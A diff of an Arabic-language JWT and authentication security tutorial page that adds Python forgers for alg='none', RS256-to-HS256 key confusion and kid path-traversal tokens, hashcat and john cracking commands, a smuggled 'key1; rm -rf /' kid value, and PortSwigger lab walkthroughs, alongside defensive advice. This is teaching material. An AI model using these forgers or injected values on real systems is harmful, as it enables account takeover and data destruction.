@@ -24,13 +24,23 @@
         section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
         h2 { color: #ffffff; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
         h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
-        p { color: #c7d2fe; }
+        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
+        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
         .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px; }
-        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 14px; }
-        .code-block { background: #0b1222; border: 1px solid #1e293b; border-radius: 10px; padding: 14px; color: #e5e7eb; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', monospace; overflow-x: auto; }
-        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 10px 12px; }
-        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 10px 12px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
+        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
+        .code-block { background: #0b1222; border: 1px solid #1e293b; border-radius: 10px; padding: 16px; color: #e5e7eb; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', monospace; overflow-x: auto; margin: 16px 0; font-size: 0.9rem; line-height: 1.5; }
+        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
+        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
+        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
+        .lab-card h4 { color: #ffffff; margin-bottom: 8px; }
+        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
+        .lab-link { display: inline-block; background: #3b82f6; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
+        .lab-link:hover { background: #2563eb; }
+        .mermaid { background: #ffffff; border-radius: 8px; padding: 16px; margin: 16px 0; }
     </style>
 </head>
 <body>
@@ -127,80 +137,435 @@
 
         <section id="jwt-basics">
             <h2><i class="fas fa-shield-alt"></i> مقدمة JWT: التوقيع (JWS) مقابل التشفير (JWE)</h2>
+            
+            <p>JSON Web Tokens (JWT) هي معيار مفتوح (RFC 7519) لنقل المعلومات بشكل آمن بين الأطراف. يتكون JWT من ثلاثة أجزاء مفصولة بنقاط، كل جزء مُرمز بـ Base64URL.</p>
+
+            <h3>🔍 بنية JWT الأساسية</h3>
+            <div class="code-block">
+// بنية JWT الأساسية
+JWT = header.payload.signature
+
+// مثال JWT حقيقي
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+            </div>
+
+            <div class="mermaid">
+graph TD
+    A[JWT Token] --> B[Header<br/>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9]
+    A --> C[Payload<br/>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ]
+    A --> D[Signature<br/>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c]
+    
+    B --> B1[{"alg": "HS256",<br/>"typ": "JWT"}]
+    C --> C1[{"sub": "1234567890",<br/>"name": "John Doe",<br/>"iat": 1516239022}]
+    D --> D1[HMACSHA256(<br/>base64UrlEncode(header) + "." +<br/>base64UrlEncode(payload),<br/>secret)]
+            </div>
+
             <div class="grid">
                 <div class="card">
-                    <h3>ما هو JWT؟</h3>
-                    <ul class="list">
-                        <li>JSON Web Token: ثلاث مقاطع Base64Url: header.payload.signature</li>
-                        <li>JWS: توقيع لضمان سلامة البيانات (HS256, RS256, ES256)</li>
-                        <li>JWE: تشفير لحماية المحتوى (RSA-OAEP + A256GCM، ECDH-ES)</li>
-                    </ul>
+                    <h3>🏷️ Header (الرأس)</h3>
+                    <p>يحتوي على نوع الرمز والخوارزمية المستخدمة:</p>
+                    <div class="code-block">
+{
+  "alg": "HS256",  // الخوارزمية المستخدمة
+  "typ": "JWT"     // نوع الرمز
+}
+                    </div>
                 </div>
                 <div class="card">
-                    <h3>خوارزميات JWS (التوقيع)</h3>
-                    <ul class="list">
-                        <li>HMAC (HS256/384/512): مفتاح سري مشترك</li>
-                        <li>RSA (RS256/384/512): مفتاح خاص للتوقيع وعام للتحقق</li>
-                        <li>ECDSA (ES256/384/512): توقيع منحني إهليلجي</li>
-                    </ul>
+                    <h3>📦 Payload (الحمولة)</h3>
+                    <p>يحتوي على البيانات (Claims) المراد نقلها:</p>
+                    <div class="code-block">
+{
+  "sub": "1234567890",    // Subject
+  "name": "John Doe",     // Custom claim
+  "iat": 1516239022,      // Issued at
+  "exp": 1516242622       // Expiration
+}
+                    </div>
                 </div>
                 <div class="card">
-                    <h3>خوارزميات JWE (التشفير)</h3>
+                    <h3>✍️ Signature (التوقيع)</h3>
+                    <p>يضمن سلامة البيانات وعدم تعديلها:</p>
+                    <div class="code-block">
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  secret
+)
+                    </div>
+                </div>
+            </div>
+
+            <h3>🔐 JWS مقابل JWE: الفرق الأساسي</h3>
+            
+            <div class="grid">
+                <div class="card">
+                    <h4>🖊️ JWS (JSON Web Signature)</h4>
+                    <p><strong>الغرض:</strong> ضمان سلامة البيانات (Integrity) والتحقق من المصدر (Authentication)</p>
+                    <p><strong>البيانات:</strong> مرئية (Base64URL فقط، ليس تشفير حقيقي)</p>
+                    <p><strong>الحماية:</strong> التوقيع الرقمي يمنع التعديل</p>
+                    
+                    <div class="warn">
+                        <strong>تحذير:</strong> البيانات في JWS مرئية لأي شخص يمكنه فك تشفير Base64URL!
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>🔒 JWE (JSON Web Encryption)</h4>
+                    <p><strong>الغرض:</strong> ضمان السرية (Confidentiality) والسلامة معاً</p>
+                    <p><strong>البيانات:</strong> مشفرة بالكامل ولا يمكن قراءتها</p>
+                    <p><strong>الحماية:</strong> التشفير + المصادقة</p>
+                    
+                    <div class="tip">
+                        <strong>نصيحة:</strong> استخدم JWE عندما تحتاج لإخفاء محتوى البيانات الحساسة
+                    </div>
+                </div>
+            </div>
+
+            <h3>🔧 خوارزميات JWS الشائعة</h3>
+            
+            <div class="grid">
+                <div class="card">
+                    <h4>HMAC (HS256/384/512)</h4>
+                    <p><strong>النوع:</strong> مفتاح سري مشترك (Symmetric)</p>
+                    <p><strong>الاستخدام:</strong> نفس المفتاح للتوقيع والتحقق</p>
+                    <p><strong>الأمان:</strong> سريع، لكن يتطلب مشاركة المفتاح السري</p>
+                    
+                    <div class="code-block">
+// إنشاء HMAC JWT
+const jwt = require('jsonwebtoken');
+const secret = 'my-super-secret-key';
+
+const token = jwt.sign({
+  sub: '123',
+  name: 'Ahmed',
+  iat: Math.floor(Date.now() / 1000)
+}, secret, { algorithm: 'HS256' });
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>RSA (RS256/384/512)</h4>
+                    <p><strong>النوع:</strong> مفتاح عام/خاص (Asymmetric)</p>
+                    <p><strong>الاستخدام:</strong> مفتاح خاص للتوقيع، عام للتحقق</p>
+                    <p><strong>الأمان:</strong> أكثر أماناً، لا يحتاج مشاركة المفتاح السري</p>
+                    
+                    <div class="code-block">
+// إنشاء RSA JWT
+const fs = require('fs');
+const privateKey = fs.readFileSync('private.pem');
+
+const token = jwt.sign({
+  sub: '123',
+  name: 'Ahmed'
+}, privateKey, { 
+  algorithm: 'RS256',
+  keyid: 'key-1'
+});
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>ECDSA (ES256/384/512)</h4>
+                    <p><strong>النوع:</strong> منحني إهليلجي (Elliptic Curve)</p>
+                    <p><strong>الاستخدام:</strong> أسرع من RSA مع نفس مستوى الأمان</p>
+                    <p><strong>الأمان:</strong> مفاتيح أصغر، أداء أفضل</p>
+                </div>
+            </div>
+
+            <h3>🔐 خوارزميات JWE المتقدمة</h3>
+            
+            <div class="grid">
+                <div class="card">
+                    <h4>Key Management Algorithms</h4>
                     <ul class="list">
-                        <li>Key Management: RSA-OAEP, RSA-OAEP-256, ECDH-ES</li>
-                        <li>Content Encryption: A128GCM, A256GCM, A128CBC-HS256</li>
-                        <li>الغرض: سرية + سلامة المحتوى المشفر</li>
+                        <li><strong>RSA-OAEP:</strong> RSA مع OAEP padding</li>
+                        <li><strong>RSA-OAEP-256:</strong> نسخة محسنة بـ SHA-256</li>
+                        <li><strong>ECDH-ES:</strong> Elliptic Curve Diffie-Hellman</li>
+                        <li><strong>A256KW:</strong> AES Key Wrap</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h4>Content Encryption Algorithms</h4>
+                    <ul class="list">
+                        <li><strong>A256GCM:</strong> AES-256-GCM (مُوصى به)</li>
+                        <li><strong>A128GCM:</strong> AES-128-GCM</li>
+                        <li><strong>A256CBC-HS512:</strong> AES-256-CBC + HMAC-SHA512</li>
                     </ul>
                 </div>
             </div>
-            <div class="code-block">
-header = {"alg":"RS256","typ":"JWT"}
-payload = {"sub":"123","iat":1710000000,"exp":1710003600}
-// JWS = base64url(header) + "." + base64url(payload) + "." + signature
+
+            <div class="tip">
+                <h4>💡 متى تستخدم كل نوع؟</h4>
+                <ul class="list">
+                    <li><strong>JWS:</strong> للتحقق من سلامة البيانات العامة (مثل معلومات المستخدم الأساسية)</li>
+                    <li><strong>JWE:</strong> للبيانات الحساسة (مثل كلمات المرور، أرقام البطاقات الائتمانية)</li>
+                    <li><strong>JWS + HTTPS:</strong> الحل الأكثر شيوعاً للتطبيقات العادية</li>
+                    <li><strong>JWE:</strong> للبيانات الحساسة جداً أو التخزين طويل المدى</li>
+                </ul>
             </div>
         </section>
 
         <section id="jwt-attacks">
-            <h2><i class="fas fa-bomb"></i> هجمات JWT (JWS)</h2>
-            <div class="grid">
-                <div class="card">
-                    <h3>None Algorithm</h3>
-                    <ul class="list">
-                        <li>العيب: قبول alg="none" بدون توقيع</li>
-                        <li>الاستغلال: إزالة التوقيع إذا كان الخادم يسمح</li>
-                        <li>الحماية: تعطيل none والتحقق الصارم من الخوارزميات المسموحة</li>
-                    </ul>
+            <h2><i class="fas fa-bomb"></i> هجمات JWT (JWS) - الأكثر خطورة وشيوعاً</h2>
+            
+            <p>JWT يحتوي على عيوب أمنية خطيرة إذا لم يُطبق بشكل صحيح. هذه الهجمات تستغل ضعف التحقق من التوقيع أو سوء إدارة المفاتيح.</p>
+
+            <div class="danger">
+                <h4>⚠️ تحذير مهم</h4>
+                <p>معظم هجمات JWT تحدث بسبب أخطاء في التطبيق وليس في المعيار نفسه. دائماً تحقق من التوقيع وتحقق من الخوارزمية المستخدمة!</p>
+            </div>
+
+            <h3>🚫 هجمة None Algorithm - الأخطر والأسهل</h3>
+            
+            <div class="attack-demo">
+                <h4>🎯 كيف تعمل الهجمة؟</h4>
+                <p>المهاجم يغير الخوارزمية إلى "none" ويحذف التوقيع، والخادم الضعيف يقبل الرمز بدون تحقق!</p>
+                
+                <div class="code-block">
+// JWT الأصلي (صحيح)
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+  "sub": "user123",
+  "role": "user",
+  "exp": 1640995200
+}
+[signature]
+
+// JWT المُخترق (none algorithm)
+{
+  "alg": "none",    // ← تغيير الخوارزمية
+  "typ": "JWT"
+}
+{
+  "sub": "user123",
+  "role": "admin",  // ← تغيير الصلاحية!
+  "exp": 1940995200 // ← تمديد انتهاء الصلاحية
+}
+// بدون توقيع!
                 </div>
-                <div class="card">
-                    <h3>Key Confusion (HS256 ↔ RS256)</h3>
-                    <ul class="list">
-                        <li>العيب: استخدام المفتاح العام كـ secret لـ HS256</li>
-                        <li>الاستغلال: توقيع HS256 بمفتاح عام تم تسريبه من /.well-known/jwks.json</li>
-                        <li>الحماية: ربط الخوارزمية بالمفتاح، رفض تبديل alg</li>
-                    </ul>
-                </div>
-                <div class="card">
-                    <h3>KID Injection</h3>
-                    <ul class="list">
-                        <li>العيب: استخدام kid لقراءة ملف/مسار محلي</li>
-                        <li>الاستغلال: kid="../../../../dev/null" أو "| cmd" عند وجود shell</li>
-                        <li>الحماية: whitelist للكِيز، عدم تمرير kid لمسارات/أوامر</li>
-                    </ul>
-                </div>
-                <div class="card">
-                    <h3>Weak Secrets</h3>
-                    <ul class="list">
-                        <li>العيب: مفاتيح HS256 ضعيفة أو افتراضية</li>
-                        <li>الاستغلال: كسر HMAC بقواميس (jwtcrack, hashcat)</li>
-                        <li>الحماية: مفاتيح قوية وعشوائية، تدوير دوري</li>
-                    </ul>
+                
+                <h4>🛠️ كود الاستغلال العملي</h4>
+                <div class="code-block">
+import base64
+import json
+
+# إنشاء header جديد
+header = {
+    "alg": "none",
+    "typ": "JWT"
+}
+
+# تعديل payload لإعطاء صلاحيات admin
+payload = {
+    "sub": "user123",
+    "role": "admin",  # تغيير من user إلى admin
+    "iat": 1640995200,
+    "exp": 1940995200  # تمديد الصلاحية لسنوات
+}
+
+# ترميز Base64URL
+header_b64 = base64.urlsafe_b64encode(
+    json.dumps(header).encode()
+).decode().rstrip('=')
+
+payload_b64 = base64.urlsafe_b64encode(
+    json.dumps(payload).encode()
+).decode().rstrip('=')
+
+# JWT بدون توقيع
+malicious_jwt = f"{header_b64}.{payload_b64}."
+print(f"Malicious JWT: {malicious_jwt}")
                 </div>
             </div>
-            <div class="code-block">
-// استغلال Key Confusion مثال توضيحي
-header = {"alg":"HS256","typ":"JWT"}
-secret = download("/.well-known/jwks.json").public_key
-signature = HMAC_SHA256(base64url(header)+"."+base64url(payload), secret)
+
+            <h3>🔀 Key Confusion Attack - استغلال الخوارزميات المختلطة</h3>
+            
+            <div class="attack-demo">
+                <h4>🎯 المشكلة: RS256 → HS256 Confusion</h4>
+                <p>الخادم يستخدم RS256 (مفتاح عام/خاص) لكن المهاجم يخدعه لاستخدام HS256 (مفتاح مشترك) مع المفتاح العام!</p>
+                
+                <div class="mermaid">
+sequenceDiagram
+    participant A as المهاجم
+    participant S as الخادم
+    participant K as JWKS Endpoint
+    
+    A->>K: GET /.well-known/jwks.json
+    K->>A: {"keys": [{"kty": "RSA", "n": "public_key_data"}]}
+    
+    Note over A: يستخدم المفتاح العام كـ HMAC secret
+    A->>A: HMAC-SHA256(data, public_key)
+    A->>S: JWT مع alg: "HS256"
+    
+    Note over S: الخادم يستخدم المفتاح العام كـ HMAC secret
+    S->>S: تحقق ناجح! ✓
+    S->>A: تم قبول JWT المزيف
+                </div>
+                
+                <h4>🛠️ كود الاستغلال</h4>
+                <div class="code-block">
+import requests
+import jwt
+import json
+from cryptography.hazmat.primitives import serialization
+
+# 1. تحميل المفتاح العام من JWKS
+jwks_url = "https://target.com/.well-known/jwks.json"
+jwks = requests.get(jwks_url).json()
+
+# 2. استخراج المفتاح العام
+public_key_data = jwks['keys'][0]
+# تحويل JWK إلى PEM format
+public_key_pem = jwk_to_pem(public_key_data)
+
+# 3. إنشاء payload خبيث
+payload = {
+    "sub": "victim_user",
+    "role": "admin",      # ترقية الصلاحيات
+    "iat": 1640995200,
+    "exp": 1940995200
+}
+
+# 4. توقيع بـ HS256 باستخدام المفتاح العام
+malicious_token = jwt.encode(
+    payload, 
+    public_key_pem,       # المفتاح العام كـ HMAC secret!
+    algorithm='HS256'     # تغيير من RS256 إلى HS256
+)
+
+print(f"Malicious Token: {malicious_token}")
+                </div>
+            </div>
+
+            <h3>💉 KID (Key ID) Injection - استغلال معرف المفتاح</h3>
+            
+            <div class="attack-demo">
+                <h4>🎯 العيب: استخدام kid لقراءة الملفات</h4>
+                <p>عندما يستخدم الخادم قيمة "kid" من header لتحديد مسار ملف المفتاح، يمكن للمهاجم التلاعب بالمسار!</p>
+                
+                <div class="code-block">
+// Header طبيعي
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1"  // الخادم يقرأ: /keys/key1
+}
+
+// Header مُخترق - Path Traversal
+{
+  "alg": "HS256", 
+  "typ": "JWT",
+  "kid": "../../../../etc/passwd"  // قراءة ملف النظام!
+}
+
+// Header مُخترق - /dev/null
+{
+  "alg": "HS256",
+  "typ": "JWT", 
+  "kid": "../../../../dev/null"  // مفتاح فارغ = توقيع فارغ
+}
+
+// Header مُخترق - Command Injection
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1; rm -rf /"  // إذا كان يُمرر للـ shell!
+}
+                </div>
+                
+                <h4>🛠️ استغلال /dev/null</h4>
+                <div class="code-block">
+import jwt
+import json
+import base64
+
+# إنشاء JWT مع kid يشير لـ /dev/null
+header = {
+    "alg": "HS256",
+    "typ": "JWT", 
+    "kid": "../../../../dev/null"  # سيقرأ الخادم محتوى فارغ
+}
+
+payload = {
+    "sub": "attacker",
+    "role": "admin",
+    "exp": 1940995200
+}
+
+# توقيع بمفتاح فارغ (لأن /dev/null فارغ)
+empty_key = ""
+token = jwt.encode(payload, empty_key, algorithm='HS256', headers=header)
+                </div>
+            </div>
+
+            <h3>🔓 Weak Secret Attack - كسر المفاتيح الضعيفة</h3>
+            
+            <div class="attack-demo">
+                <h4>🎯 المشكلة: مفاتيح HMAC ضعيفة</h4>
+                <p>كثير من المطورين يستخدمون مفاتيح ضعيفة أو افتراضية يمكن كسرها بالقوة الغاشمة!</p>
+                
+                <div class="code-block">
+// أمثلة على مفاتيح ضعيفة شائعة
+"secret"
+"password" 
+"123456"
+"jwt_secret"
+"your-256-bit-secret"
+"mySecretKey"
+""  // مفتاح فارغ!
+                </div>
+                
+                <h4>🛠️ كسر JWT بـ Hashcat</h4>
+                <div class="code-block">
+# حفظ JWT في ملف
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt
+
+# كسر بـ Hashcat
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# أو استخدام john
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
+
+# أو استخدام jwt_tool
+python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt jwt.txt
+                </div>
+                
+                <h4>🛠️ إنشاء JWT جديد بعد كسر المفتاح</h4>
+                <div class="code-block">
+import jwt
+
+# المفتاح الذي تم كسره
+cracked_secret = "secret"
+
+# إنشاء payload جديد بصلاحيات admin
+admin_payload = {
+    "sub": "attacker",
+    "role": "admin", 
+    "iat": 1640995200,
+    "exp": 1940995200
+}
+
+# إنشاء JWT جديد
+admin_token = jwt.encode(admin_payload, cracked_secret, algorithm='HS256')
+print(f"Admin Token: {admin_token}")
+                </div>
+            </div>
+
+            <div class="tip">
+                <h4>🛡️ كيف تحمي نفسك من هجمات JWT؟</h4>
+                <ul class="list">
+                    <li><strong>رفض "none" تماماً:</strong> لا تقبل alg="none" أبداً</li>
+                    <li><strong>تحديد الخوارزميات المسموحة:</strong> whitelist صارم للخوارزميات</li>
+                    <li><strong>ربط الخوارزمية بالمفتاح:</strong> منع Key Confusion</li>
+                    <li><strong>تنظيف kid:</strong> whitelist أو regex للتحقق من kid</li>
+                    <li><strong>مفاتيح قوية:</strong> 256-bit عشوائية للـ HMAC</li>
+                    <li><strong>تدوير المفاتيح:</strong> تغيير دوري للمفاتيح</li>
+                </ul>
             </div>
         </section>
 
@@ -289,18 +654,232 @@ signature = HMAC_SHA256(base64url(header)+"."+base64url(payload), secret)
         </section>
 
         <section id="labs">
-            <h2><i class="fas fa-flask"></i> مختبرات عملية (10)</h2>
-            <div class="grid">
-                <div class="card"><h3>1) Brute Force + Rate Limiting</h3><p>توليد قوائم كلمات مرور واختبار الحماية.</p></div>
-                <div class="card"><h3>2) Session Fixation</h3><p>استغلال جلسة مثبتة قبل تسجيل الدخول.</p></div>
-                <div class="card"><h3>3) Weak Reset Token</h3><p>التنبؤ برموز إعادة التعيين.</p></div>
-                <div class="card"><h3>4) JWT None/HS256 Confusion</h3><p>تبديل الخوارزميات لتجاوز التحقق.</p></div>
-                <div class="card"><h3>5) OAuth Code Interception</h3><p>سرقة Authorization Code عبر redirect_uri.</p></div>
-                <div class="card"><h3>6) PKCE Downgrade</h3><p>استغلال ضعف code_verifier.</p></div>
-                <div class="card"><h3>7) Scope Escalation</h3><p>طلب صلاحيات غير لازمة وتجاوز التحكم.</p></div>
-                <div class="card"><h3>8) Account Linking Abuse</h3><p>ربط حساب بدون تحقق ملكية البريد.</p></div>
-                <div class="card"><h3>9) Refresh Token Misuse</h3><p>استخدام refresh tokens غير المنتهية.</p></div>
-                <div class="card"><h3>10) 2FA Bypass Logic</h3><p>تجاوز 2FA لضعف التحقق بعد كلمة المرور.</p></div>
+            <h2><i class="fas fa-flask"></i> مختبرات عملية (15) - PortSwigger Academy</h2>
+            
+            <p>مختبرات متدرجة الصعوبة من PortSwigger Academy لتطبيق ما تعلمته عملياً. كل مختبر يحتوي على خطوات مفصلة ونصائح للحل.</p>
+
+            <h3>🔓 مختبرات Authentication</h3>
+            
+            <div class="lab-card">
+                <h4>🧪 Lab 1: Username enumeration via different responses</h4>
+                <p><strong>الهدف:</strong> اكتشاف أسماء المستخدمين الصحيحة من خلال اختلاف الردود</p>
+                <p><strong>التقنية:</strong> تحليل رسائل الخطأ المختلفة بين "Invalid username" و "Invalid password"</p>
+                <div class="code-block">
+# خطوات الحل:
+1. استخدم Burp Intruder لتجربة قائمة usernames
+2. ابحث عن اختلاف في response length أو error message
+3. استخدم username الصحيح مع password list
+4. سجل دخول بالبيانات الصحيحة
+                </div>
+                <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 2: 2FA broken logic</h4>
+                <p><strong>الهدف:</strong> تجاوز المصادقة الثنائية عبر استغلال منطق معيب</p>
+                <p><strong>التقنية:</strong> تغيير معرف المستخدم في cookie لتجاوز 2FA للضحية</p>
+                <div class="code-block">
+# خطوات الحل:
+1. سجل دخول بحسابك وفعّل 2FA
+2. اعترض طلب /login2 وغيّر verify parameter للضحية
+3. أرسل طلب GET /login2 مع cookie للضحية
+4. استخدم Brute Force على 4-digit 2FA code
+5. سجل دخول كالضحية
+                </div>
+                <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 3: Password reset broken logic</h4>
+                <p><strong>الهدف:</strong> استغلال عيب في منطق إعادة تعيين كلمة المرور</p>
+                <p><strong>التقنية:</strong> تغيير username parameter في طلب reset لاستهداف ضحية أخرى</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابدأ password reset لحسابك
+2. اعترض طلب POST /forgot-password
+3. غيّر username parameter للضحية (carlos)
+4. استخدم reset token الخاص بك لتغيير كلمة مرور الضحية
+5. سجل دخول بالبيانات الجديدة
+                </div>
+                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <h3>🔐 مختبرات JWT</h3>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 4: JWT authentication bypass via unverified signature</h4>
+                <p><strong>الهدف:</strong> تجاوز المصادقة عبر JWT غير محقق التوقيع</p>
+                <p><strong>التقنية:</strong> تعديل payload دون تحديث signature</p>
+                <div class="code-block">
+# خطوات الحل:
+1. سجل دخول وانسخ JWT من cookie
+2. فك تشفير JWT في jwt.io
+3. غيّر "sub" من "wiener" إلى "administrator" 
+4. احتفظ بنفس signature القديم
+5. استبدل cookie واعرض /admin
+                </div>
+                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 5: JWT authentication bypass via flawed signature verification</h4>
+                <p><strong>الهدف:</strong> استغلال ثغرة "none algorithm"</p>
+                <p><strong>التقنية:</strong> تغيير alg إلى "none" وحذف signature</p>
+                <div class="code-block">
+# خطوات الحل:
+1. فك تشفير JWT الحالي
+2. غيّر header: {"alg":"none","typ":"JWT"}
+3. غيّر payload: "sub" إلى "administrator"
+4. أعد ترميز header.payload بـ Base64URL
+5. JWT النهائي: header.payload. (بدون signature)
+                </div>
+                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 6: JWT authentication bypass via weak signing key</h4>
+                <p><strong>الهدف:</strong> كسر مفتاح HMAC ضعيف وإنشاء JWT جديد</p>
+                <p><strong>التقنية:</strong> استخدام hashcat لكسر secret ثم توقيع JWT جديد</p>
+                <div class="code-block">
+# خطوات الحل:
+1. احفظ JWT في ملف: echo "jwt_here" > jwt.txt
+2. كسر بـ hashcat: hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist
+3. استخدم secret المكسور لإنشاء JWT جديد:
+   python3 -c "import jwt; print(jwt.encode({'sub':'administrator'}, 'secret', 'HS256'))"
+4. استبدل cookie بالـ JWT الجديد
+                </div>
+                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 7: JWT authentication bypass via algorithm confusion</h4>
+                <p><strong>الهدف:</strong> استغلال Key Confusion (RS256 → HS256)</p>
+                <p><strong>التقنية:</strong> استخدام المفتاح العام كـ HMAC secret</p>
+                <div class="code-block">
+# خطوات الحل:
+1. احصل على JWT وفك تشفيره
+2. حمّل المفتاح العام من /jwks.json
+3. حوّل JWK إلى PEM format
+4. وقّع JWT جديد بـ HS256 مستخدماً المفتاح العام:
+   jwt.encode({'sub':'administrator'}, public_key, 'HS256')
+5. استبدل cookie وادخل /admin
+                </div>
+                <a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <h3>🔗 مختبرات OAuth 2.0</h3>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 8: Authentication bypass via OAuth implicit flow</h4>
+                <p><strong>الهدف:</strong> تجاوز المصادقة في OAuth implicit flow</p>
+                <p><strong>التقنية:</strong> تعديل email parameter في POST request</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابدأ OAuth login مع social media
+2. اعترض POST request إلى /authenticate
+3. غيّر email parameter إلى carlos@carlos-montoya.net
+4. أرسل الطلب وستسجل دخول كـ carlos
+5. اعرض /admin لحذف المستخدم
+                </div>
+                <a href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 9: Forced OAuth profile linking</h4>
+                <p><strong>الهدف:</strong> ربط حساب OAuth بحساب ضحية عبر CSRF</p>
+                <p><strong>التقنية:</strong> إنشاء CSRF لربط حسابك بحساب admin</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابدأ OAuth linking لحسابك
+2. توقف قبل الخطوة الأخيرة وانسخ URL
+3. أنشئ HTML page مع iframe للـ URL
+4. أرسل الرابط للضحية (admin)
+5. سجل دخول بحساب OAuth وستصبح admin
+                </div>
+                <a href="https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 10: OAuth account hijacking via redirect_uri</h4>
+                <p><strong>الهدف:</strong> اختطاف حساب عبر استغلال redirect_uri</p>
